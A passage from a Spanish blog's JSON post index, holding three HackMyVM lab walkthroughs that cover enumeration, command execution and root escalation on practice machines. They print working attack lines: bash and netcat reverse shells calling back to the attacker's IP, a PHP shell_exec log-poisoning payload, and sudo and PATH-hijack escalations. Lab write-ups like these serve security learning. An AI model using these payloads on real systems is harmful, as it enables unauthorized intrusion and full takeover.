    "categories": "HackMyVm",
    "tags": "",
    "date": "2023-11-16 00:00:00 -0300",
    





    
    "snippet": "En esta maquina en teoría sencilla nos encontramos los siguientes  retos y complicaciones  Averiguar ip victima.  Enumeracion  Remote code execution  Escalada de privelegiosHerramientes usadas:  ar...",
    "content": "En esta maquina en teoría sencilla nos encontramos los siguientes  retos y complicaciones  Averiguar ip victima.  Enumeracion  Remote code execution  Escalada de privelegiosHerramientes usadas:  arp-scan  nmap  wfuzz , dirbuster ,wfuzz  ssh  sudoLo primero como siempre averiguar la ip de la victima para ello ejecutamos\tarp-scan --localnetUna vez tenemos clara la ip  lanzamos nmap .\tnmap -T4 -sCSV -p- 192.168.0.104Como podemos observar nos muestra el puerto 22 y el 80 abierto.Es momento de investigar manualmente la pagina que corre en el servidor http , para ganar algo de tiempo mientras revisamos la web lanzamos dirb y gobuster que son dos programas para fuzzing.\tgobuster -q dir -w /usr/share/dirbuster/directory-list-2.3-small.txt -x html,htm,php,txt,xml -u http://192.168.0.104 --exclude-length 3690Lo primero que nos encontramos es el index por defecto del servidor nginx , no hay nada en el codigo de ese .htmlObservamos los resultados tanto de dirb como gobuster e investigamos los links que nos a proporcionado.Responden a las siguientes rutas.  index.htm  sitemap.xml  note.txt  secret.phpEl index htm nos lleva a una web con una imagen , observando el codigo fuente vemos que nos muestra la misma ruta que nos dio gobuster /secret.php.El sitemap.xml nos indica una ruta que no existe.El txt nos indica que el secreto de esta maquina esta en la enumeración.Y por ultimo la ruta hacia secret.php nos redirecciona a una imagen externa (Un cahondo el tipo que creo el reto, nos dice que usemos el cerebro )En el codigo de index.htm vemos que hay un form escondido debemos de inetentar llegar a el , construimos la url con los datos que aparecen en el form .\thttp://192.168.0.104/secret.php?HackMyVMComo podemos observar es el sitio correcto pero la manera incorrecta pues nos dice que probemos otro método , lo único que se me ocurre es como se tramita la petición de esa web , las partes visibles son GET y las ocultas POST  por resumirlo de esta manera burda y probablemente poco acertada.Después de una par de horas investigando y buscando la forma de poder modificar la petición me instalo la extensión de firefox http request maker.  Se debe de poder hacer con curl , burpsuite e imagino que wgetEl unico fichero que nos falta por revisar el codigo es secret.php asi que vamos ello .Como vemos es un script que lo que hace es que cuando la solicitud no va por post nos redirecciona a otro lugar y cuando la realizas por post y y usas HackMyVM te prensenta la posibilidad de ejecutar comandos.Yo pensaba en una revshell pero al final del todo encontramos  un user y una pass , recordemos que el 22 esta abierto y sin mas vamos a probar.Entramos con ese user y passAhora como siempre lo primero sudo y luego find buscando permisos setiud.Con sudo -l tenemos suerte nos vamos como siempre a gtfobins y buscamos “ip” seguimos los pasos del punto b que son los que a mi me han funcionado y nos olvidamos de find.En el momento que ejecutamos los dos comandos nos convertimos en root.  Estos ultimos comandos no se que hacian y decidi que me lo explicara la puta IA.      sudo ip netns add foo: Este comando crea un nuevo espacio de nombres de red llamado “foo”. Los espacios de nombres de red proporcionan entornos de red aislados, lo que significa que los procesos que se ejecutan en un espacio de nombres de red no pueden ver ni comunicarse con los procesos que se ejecutan en otros espacios de nombres de red.    sudo ip netfs exec foo /bin/sh :Este ejcuta bin sh dentro del espacio de red foo , lo cual hace que nos lancemos una shell de root.  Muchas gracias por leer. Acabe tan harto de leer sobre las peticiones que al final no me acorde de la flag de root ."
  },
  
  {
    "title": "Friendly, HACKMYVM",
    "url": "/posts/friendly/",
    "categories": "HackMyVm",
    "tags": "",
    "date": "2023-11-16 00:00:00 -0300",
    





    
    "snippet": "En este reto nos encontramos con escaneo , configuracion erronea en uno de sus servicios y escalado de privilegios con binario.Este es el primer reto que consiguo hacer solo consultando la web de g...",
    "content": "En este reto nos encontramos con escaneo , configuracion erronea en uno de sus servicios y escalado de privilegios con binario.Este es el primer reto que consiguo hacer solo consultando la web de gotfbins para saber para aprender como usar el binario.Herramientas y recursos web utilizados  arp-scan  nmap  gotfbinsEscaneoEmpezamos averiguando la ip de la maquina victima para ello ejecutamos la herramienta arp-scan nos fijamos en el resultado y buscamos la mac que empieza por 08:00 esa mac es de virtualbox.Ejecutamos:sudo arp-scan --localnetUna vez obtenida la ip pasamos al escanear puertosnmap -sC -sV -A -p- --min-rate 5000 $ipIntrusionVemos que tiene el 21 y el 80 abierto en el 21 tenemos login anonynous y nos permite subir ficheros.Nos subimos un webshell al servidor que podemos encontrar en github.Creamos un archivo .html con el siguiente contenido , lo subimos y posteriormente lo ejecutamos a traves del webshell que subimos#!/bin/bash bash -i &gt;&amp; /dev/tcp/192.168.0.112/443 0&gt;&amp;1Antes de ejecutar desde el webshell el archivo que subimos debemos ponernos con netcat a la escucha.nc -lnvp 443EscaladaUna vez con la tty en nuestra maquina atacante buscamos binarios por con permisos para ello probamos primero un :sudo -lEl binario que nos muestra nos sirve para la escalada de privilegiospodemos vistar gtofbins para consultaAhora ejecutamos vim como se indica gotfbins.sudo vim -c ':!/bin/sh'Obtendremos automaticamente rootSi os interesan las flags no os olvideis de buscarlas .Gracias por leer este reto."
  },
  
  {
    "title": "Drifting Blues 3 , HACKMYVM",
    "url": "/posts/driftingblues3/",
    "categories": "HackMyVm",
    "tags": "",
    "date": "2023-11-16 00:00:00 -0300",
    





    
    "snippet": "En este reto nos encontramos escaneo , decodificacion de bas64 , log poisoning y  abuso del $PATH.No es un reto extremadamente dificil en el aprendemos como usar el path para escalar privilegios y ...",
    "content": "En este reto nos encontramos escaneo , decodificacion de bas64 , log poisoning y  abuso del $PATH.No es un reto extremadamente dificil en el aprendemos como usar el path para escalar privilegios y comprobaremos lo delicado que es mostrar logs a traves de un usario.Herramientas y recursos web utilizados  arp-scan  nmap  urlencoder  https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/EscaneoEmpezamos averiguando la ip de la maquina victima para ello ejecutamos la herramienta arp-scan nos fijamos en el resultado y buscamos la mac que empieza por 08:00 esa mac es de virtualbox.Ejecutamos:sudo arp-scan --localnetUna vez obtenida la ip pasamos al escanear puertosnmap -A -n -p- ipvictimaVemos que nos muestra el 22 y el 80 y en el 80 ya nos muestra una ruta /eventeadmins que debe de extraerla del fichero robots.txt todo esto lo puedes ver por firefox directamente.Revisamos la pagina y del texto podemos ver dos nombre de posibles usuarios uno john y el otro es buddyG , tambien nos dice que cheqeemos /littlequeenofspades.htmlRevisamos la pagina y a simple vista a mi no me dice nada , pero revisando su codigo encuentro un cifrado en base64  nos copiamos el churro y procedemos a decodificarlo.El resultado de la primera decodificacion nos da otro codigo base64 , decodificamos los dos y nos da una ruta.Vamos a la ruta que nos proporciono el codigo adminsfixit.php y vemos que es es el auth log ssh.Log poisoningSi intentamos login con cualuier usuario vemos que aparece reflejado en el log al refrescar la pagina.Ahora es el momento de intentar envenenar el log para nuestro beneficio subiendo una carga util que nos permita ejecutar codigo de manera remota “RCE”ssh &lt;?php echo shell_exec($_GET['cmd']); ?&gt;@ipvictimaSi ha funcionado deberiamos de poder ejuctar codigo con la siguiente ruta:  http://$ipvictima/adminsfixit.php?cmd=lsPara que los resultados sean mas visibles podemos visualizar la pagina por su codigo fuente.Desde mi punto de vista ya conseguimos lo mas complicado , ahora lo mejor en mandarnos una reverse shell , para ello ejecutamos tanto en nuestro equipo como en la victima netcat.Primero ponemos a la escucha la maquina atacante con :nc -lnvp 80 Y en la victima si fuera necesario podemos encodear la url  para ello vamos a urlencoder.orghttp://$ipvictima/adminsfixit.php?cmd=nc%20-e%20%2Fbin%2Fsh%20192.168.0.112%2080Ya tenemos la shell en nuestra maquina ahora toca hacerla interactivapython3 -c 'import pty; pty.spawn(\"/bin/sh\")'Escalada de privilegiosEncontramos un usario en home robertj el cual tiene el fichero user.txt el cual no podemos leer por permisos pues aun somos el usario  www-data.Vamos a probar a crear las claves  ssh para poder conectarnos por ssh con ese usario antes deberiamos comprobar la config de sshd para ver si el usuario tiene el authorized keys activado si no esta olvidemos esta escalada.Podemos crearlas en cualquier lugar pero mejor nos posicionamos en el directio .ssh de su home asi no la movemos despuesssh-keygen -f robertjUna vez creadas copiamos la clave publica a authorized_keys dentro de .ssh “obvio” y nos copiamos la privada a nuestra maquina atacante.cp clavepublica authorized_keysProbamos a conectar por sshssh -i robertj robertj@192.168.0.102Si lo hacemos tal y como se crearon las claves y copiamos a mi no me funciono hay que modificar los permisos y ponerlos solo de lectura para el propietario chmod 400 robertjVolvemos a ejecutar ahora nos pide la contraseña que dimos cuando crearmos las clavesUna vez dentro cat al user.txt para obtener la flag  413f****“*Una vez como el usuario comprobamos si hay algun binario que pueda ejecutar como root con sudo y tambien binarios con suidsudo -lfind /  -perm /4000El binario en cuestion es getinfo y nos vamos a aprovechar  y alterar el path.getinfo hace uso de cat , asi que nos creammos un fichero de nombre cat con el contenido /bin/bash y añadimos la ruta donde tengamos nuestro cat trucado a nuestro pathecho /bin/bash &gt; catLe damos permisos de ejucion para todos.chmod 777 catAñadimos nuestra ruta al pathexport  PATH=/tmp:$PATH En el comando anterior veis en directorio que he usado para crear el cat malicioso , comprobamos que nuestro directorio este en el PATH.echo $PATHAhora estamos listos para ejecutar getinfo ni bien se ejecute deberia leer nuestro cat trucado y hacernos root al toqueAcordaros de la flag si os interesa , gracias por leer mis apuntes."
  }
  
]

